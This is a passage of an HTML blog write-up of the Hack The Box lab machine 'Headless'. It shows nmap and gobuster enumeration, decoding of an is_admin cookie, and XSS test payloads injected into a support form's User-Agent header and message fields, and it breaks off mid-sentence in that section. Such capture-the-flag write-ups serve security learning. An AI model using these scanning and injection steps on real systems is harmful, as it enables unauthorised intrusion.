@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>HTB Machine — Headless&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="HTB Machine — Headless">
+  
+    <meta name="description" content="Headless is a simple and straightforward machine, which is a nice change of pace with the recent releases. The foothold involves cross-site scripting, an attack vector often overlooked in HTB boxes. I’ll exploit it to steal an admin cookie and access a dashboard page, which is vulnerable to OS command injection. Privesc is simply abusing an insecure bash script ran in sudo.">
+    <meta property="og:description" content="Headless is a simple and straightforward machine, which is a nice change of pace with the recent releases. The foothold involves cross-site scripting, an attack vector often overlooked in HTB boxes. I’ll exploit it to steal an admin cookie and access a dashboard page, which is vulnerable to OS command injection. Privesc is simply abusing an insecure bash script ran in sudo.">
+  
+  
+    <meta property="og:image" content="https://labs.hackthebox.com/storage/avatars/26e076db204a74b99390e586d7ebcf8c.png">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="/">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://github.com/ch3ng625", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
+      <span>GitHub</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
+      <span>LinkedIn</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
+      <span>HackTheBox</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://labs.hackthebox.com/storage/avatars/26e076db204a74b99390e586d7ebcf8c.png"></span>
+      </div>
+    
+    <h1 class="Header__Title">HTB Machine — Headless</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sun, Jul 21, 2024</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/HTB">HTB</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
+            <a href="tag/Linux">Linux</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
+            <a href="tag/Easy">Easy</a>
+          </span>
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/8ea1e5f2667c41f4b8bf479b47d6d7fc" class="PageRoot"><h3 id="https://www.notion.so/1eb3ef8e3a7146edb4002b32d949e993" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1eb3ef8e3a7146edb4002b32d949e993"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h3><div id="https://www.notion.so/1d997bf2161e41bdbaaa329eb1ae4500" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Headless is a simple and straightforward machine, which is a nice change of pace with the recent releases. The foothold involves cross-site scripting, an attack vector often overlooked in HTB boxes. I’ll exploit it to steal an admin cookie and access a dashboard page, which is vulnerable to OS command injection. Privesc is simply abusing an insecure bash script ran in sudo.</span></span></p></div><div id="https://www.notion.so/3fd1308440074e2897c21000bc22a709" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/dafd560f0b6d49a6bb1bc0818245b31d" class="Divider"></div><h3 id="https://www.notion.so/a44d5fa7805a4d9388b1432ffeb8f6d3" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/a44d5fa7805a4d9388b1432ffeb8f6d3"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h3><div id="https://www.notion.so/3b2cf274d70f45dd87d85c6e77841b01" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Nmap:</strong></span></span></p></div><pre id="https://www.notion.so/74ee0c7a7293433993b14caa31b9d69b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/headless]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap --min-rate 1000 -p- 10.129.32.248
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-28 23:51 ACDT
+Nmap scan report for 10.129.32.248
+Host is up (0.32s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5000/tcp open  upnp
+
+Nmap done: 1 IP address (1 host up) scanned in 73.08 seconds
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/headless]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap -A -p 22,5000 10.129.32.248
+   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-28 23:54 ACDT
+Nmap scan report for 10.129.32.248
+Host is up (0.33s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
+|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
+5000/tcp open  upnp?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/2.2.2 Python/3.11.2
+|     Date: Thu, 28 Mar 2024 13:24:16 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 2799
+|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang=&quot;en&quot;&gt;
+|     &lt;head&gt;
+|     &lt;meta charset=&quot;UTF-8&quot;&gt;
+|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+|     &lt;title&gt;Under Construction&lt;/title&gt;
+|     &lt;style&gt;
+|     body {
+|     font-family: &#x27;Arial&#x27;, sans-serif;
+|     background-color: #f7f7f7;
+|     margin: 0;
+|     padding: 0;
+|     display: flex;
+|     justify-content: center;
+|     align-items: center;
+|     height: 100vh;
+|     .container {
+|     text-align: center;
+|     background-color: #fff;
+|     border-radius: 10px;
+|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
+|   RTSPRequest: 
+|     &lt;!DOCTYPE HTML&gt;
+|     &lt;html lang=&quot;en&quot;&gt;
+|     &lt;head&gt;
+|     &lt;meta charset=&quot;utf-8&quot;&gt;
+|     &lt;title&gt;Error response&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;h1&gt;Error response&lt;/h1&gt;
+|     &lt;p&gt;Error code: 400&lt;/p&gt;
+|     &lt;p&gt;Message: Bad request version (&#x27;RTSP/1.0&#x27;).&lt;/p&gt;
+|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+&lt;..SNIP..&gt;
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 443/tcp)
+HOP RTT       ADDRESS
+1   325.42 ms 10.10.14.1
+2   325.45 ms 10.129.32.248
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 132.00 seconds</span></span></span></code></pre><div id="https://www.notion.so/bc665552c8824f479d04eb15b0072794" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nmap</code></span><span class="SemanticString"> found 2 open ports. It couldn’t quite identify the service running on port 5000, but based on the raw response, we can be quite confident that it’s a webserver.</span></span></p></div><div id="https://www.notion.so/f53beccd9fa94e1fa83614164e68d792" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/11d2c57a716c4409b2bf6123e85d4bc9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP5000 — HTTP:</strong></span></span></p></div><div id="https://www.notion.so/465363c496c84a0687cd85ca65ea8238" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe3a0657a-3bbc-4741-b1e2-081704d20025%2FUntitled.png?width=681&amp;table=block&amp;id=465363c4-96c8-4a06-87cd-85ca65ea8238"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe3a0657a-3bbc-4741-b1e2-081704d20025%2FUntitled.png?width=681&amp;table=block&amp;id=465363c4-96c8-4a06-87cd-85ca65ea8238" style="width:681px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/a2e13d6bb0104fcdae7897f2a03b0dcd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">No hostname was identified, and the site can be directly accessed via IP. It’s an under construction page with a 25 day countdown, but it resets everytime I reload the page. Other than that there’s a single button that redirects to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/support</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/df13bccb50fd4fd881943be2afffacba" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Wappalyzer also detected it’s running Python Flask.</span></span></p></div><div id="https://www.notion.so/465141dbf67e4430b920acc23b261c2c" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Feb9d3875-9212-4e16-94e9-5181cd496675%2FUntitled.png?width=483&amp;table=block&amp;id=465141db-f67e-4430-b920-acc23b261c2c"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Feb9d3875-9212-4e16-94e9-5181cd496675%2FUntitled.png?width=483&amp;table=block&amp;id=465141db-f67e-4430-b920-acc23b261c2c" style="width:483px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/7e5ab7e80f5f4ee5a4c1eb5d9918d50a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I checked the page response in Burp, and found an interesting cookie: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">is_admin</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/26682fac94bc40879a9111a208eb5647" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>HTTP/1.1 200 OK
+Server: Werkzeug/2.2.2 Python/3.11.2
+Date: Thu, 28 Mar 2024 13:38:06 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 2799
+Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
+Connection: close
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;..SNIP..&gt;</span></span></span></code></pre><div id="https://www.notion.so/926c50f9fd7a45dbbe815ce0592f8866" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The first part of the cookie is a base64 string, and it decodes to “user”. I repeated the request several times and every time the cookie’s value is the same, indicating it’s not dynamically generated. The cookie name also hinted that there’s an admin user somewhere.</span></span></p></div><pre id="https://www.notion.so/33f721d85e1645aead24d9e785f52372" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/headless]
+└─$</span></mark></span><span class="SemanticString"><span> echo InVzZXIi | base64 -d  
+                 
+&quot;user&quot;</span></span></span></code></pre><div id="https://www.notion.so/7ae3fb9b57f64c95a05f8afb46aa673c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/support</code></span><span class="SemanticString"> page looks just like a dummy contact form I see on many other HTB boxes. The same page just gets returned back when I submitted some random data, and I’m not sure if the data submitted even gets processed at all, so I’ll leave it for now.</span></span></p></div><div id="https://www.notion.so/73363e77a38f4977a66082afec298aa2" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F80a95991-6893-4c7b-8c36-53fc7eaddd7e%2FUntitled.png?width=533&amp;table=block&amp;id=73363e77-a38f-4977-a660-82afec298aa2"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F80a95991-6893-4c7b-8c36-53fc7eaddd7e%2FUntitled.png?width=533&amp;table=block&amp;id=73363e77-a38f-4977-a660-82afec298aa2" style="width:533px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/235d687f5c964450aa5e76cb10ae7a55" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/a8a60818a4da4097a82d82b287ab0957" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Directory Busting:</strong></span></span></p></div><pre id="https://www.notion.so/a101007da7ae4cff9bd33b51554d2c88" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/headless]
+└─$</span></mark></span><span class="SemanticString"><span> gobuster dir -u http://10.129.32.248:5000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.32.248:5000
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/support              (Status: 200) [Size: 2363]
+/dashboard            (Status: 500) [Size: 265]
+Progress: 4014 / 220561 (1.82%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 4014 / 220561 (1.82%)
+===============================================================
+Finished
+===============================================================</span></span></span></code></pre><div id="https://www.notion.so/cf3f62b057454557816fee14d537bad1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">gobuster</code></span><span class="SemanticString"> found two endpoints: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/support</code></span><span class="SemanticString"> which I looked at already, and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/dashboard</code></span><span class="SemanticString">. I’m unauthorized to view that page, however. I’m guessing that authentication is done with the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">is_admin</code></span><span class="SemanticString"> cookie.</span></span></p></div><div id="https://www.notion.so/424d9230f5664d3e8e776d2526684946" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F371b4ac1-1d0a-471f-8e74-12cd00a2b799%2FUntitled.png?width=708&amp;table=block&amp;id=424d9230-f566-4d3e-8e77-6d2526684946"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F371b4ac1-1d0a-471f-8e74-12cd00a2b799%2FUntitled.png?width=708&amp;table=block&amp;id=424d9230-f566-4d3e-8e77-6d2526684946" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/b4dbb3cd5f05418aa9af2cfd321dfdd8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Interestingly, if I visit the page via </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString">, it returned a 500 instead. Turns out that the page crashes if the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">is_admin</code></span><span class="SemanticString"> cookie is malformed or missing.</span></span></p></div><pre id="https://www.notion.so/ac82b52a5521489fa98c8e3b71e1fb6c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/headless]
+└─$</span></mark></span><span class="SemanticString"><span> curl http://10.129.32.248:5000/dashboard -v   
+                                                       
+*   Trying 10.129.32.248:5000...
+* Connected to 10.129.32.248 (10.129.32.248) port 5000
+&gt; GET /dashboard HTTP/1.1
+&gt; Host: 10.129.32.248:5000
+&gt; User-Agent: curl/8.5.0
+&gt; Accept: */*
+&gt; 
+&lt; HTTP/1.1 500 INTERNAL SERVER ERROR
+&lt; Server: Werkzeug/2.2.2 Python/3.11.2
+&lt; Date: Thu, 28 Mar 2024 13:48:28 GMT
+&lt; Content-Type: text/html; charset=utf-8
+&lt; Content-Length: 265
+&lt; Connection: close
+&lt; 
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;500 Internal Server Error&lt;/title&gt;
+&lt;h1&gt;Internal Server Error&lt;/h1&gt;
+&lt;p&gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.&lt;/p&gt;
+* Closing connection</span></span></span></code></pre><div id="https://www.notion.so/786747b7a8124bb78e285d11530d0d89" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Without this cookie, I can’t progress any further.</span></span></p></div><div id="https://www.notion.so/ea72d86d47164c368a9b74087b856d9e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/62d1a0dd6b944a14b3d42ed3f7c81182" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Support Page:</strong></span></span></p></div><div id="https://www.notion.so/7ce86c45b82642cab018aaa38127dd86" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">At this point I was somewhat lost, and the only remaining option I could think of was to submit XSS payload in the contact form, with a slim hope that someone would review the data and get infected. I started throwing random XSS payloads in the form, and to my shock, it returned something different.</span></span></p></div><div id="https://www.notion.so/f740a6a1a0c84afda3b0b94cb4672a69" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F0f0d5526-3d78-4e2a-9392-9e55f5fc81f5%2FUntitled.png?width=684&amp;table=block&amp;id=f740a6a1-a0c8-4afd-a3b0-b94cb4672a69"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F0f0d5526-3d78-4e2a-9392-9e55f5fc81f5%2FUntitled.png?width=684&amp;table=block&amp;id=f740a6a1-a0c8-4afd-a3b0-b94cb4672a69" style="width:684px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/993e4053eff04027921fa929e8d94dc9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Despite being one of the most frequently exploited attack vector and consistently appearing in OWASP’s Top 10 lists, XSS is rarely seen on HTB boxes, particularly on easy ones. Hence I often overlooked XSS and didn’t bother testing for it, and was genuinely surprised that it’s part of the attack chain here.</span></span></p></div><div id="https://www.notion.so/28b942d4ed8640c7806c79bc6e1f80e1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">So whenever dangerous data such as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&lt;script&gt;alert()&lt;/script&gt;</code></span><span class="SemanticString"> are detected to be submitted, the server generates the above report that will be “</span><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">sent to the administrators for investigation</em></span><span class="SemanticString">”.</span></span></p></div><div id="https://www.notion.so/73ea4232ebf74caf8448ca5683a5218f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The report contains most of the request’s headers, which are also user-controlled. If sanitization are not done properly here, I can poison the headers with XSS payloads that would hit the reviewing admin.</span></span></p></div><div id="https://www.notion.so/b06acd71e4c24461a37a319e85c51ffe" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I repeated the POST request, and set </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">User-Agent</code></span><span class="SemanticString"> as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&lt;h1&gt;XSS&lt;/h1&gt;</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/6a77b6e3e18d42e08411ec61bbc35244" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>POST /support HTTP/1.1
+Host: 10.129.32.248:5000
+Content-Length: 105
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.129.32.248:5000
+Content-Type: application/x-www-form-urlencoded
+User-Agent: &lt;h1&gt;XSS&lt;/h1&gt;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.129.32.248:5000/support
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
+Connection: close
+
+fname=asdf&amp;lname=asdf&amp;email=asdf%40asdf.com&amp;phone=00000000&amp;message=%3Cscript%3Ealert%28%29%3C%2Fscript%3E</span></span></span></code></pre><div id="https://www.notion.so/7c309230c14e4c709c442f25abd9210c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The resulting report confirms that there’s no sanitization done on this header.</span></span></p></div><div id="https://www.notion.so/69483f31b781497a8d601ea5fbb7fd67" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fdd1474f1-898f-4756-8700-353217c2bcda%2FUntitled.png?width=662&amp;table=block&amp;id=69483f31-b781-497a-8d60-1ea5fbb7fd67"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fdd1474f1-898f-4756-8700-353217c2bcda%2FUntitled.png?width=662&amp;table=block&amp;id=69483f31-b781-497a-8d60-1ea5fbb7fd67" style="width:662px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/618af8578d854c94a0b3ca408bb04411" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">In fact, every single header except </span><span class="SemanticString"><code class="SemanticString__Fragment 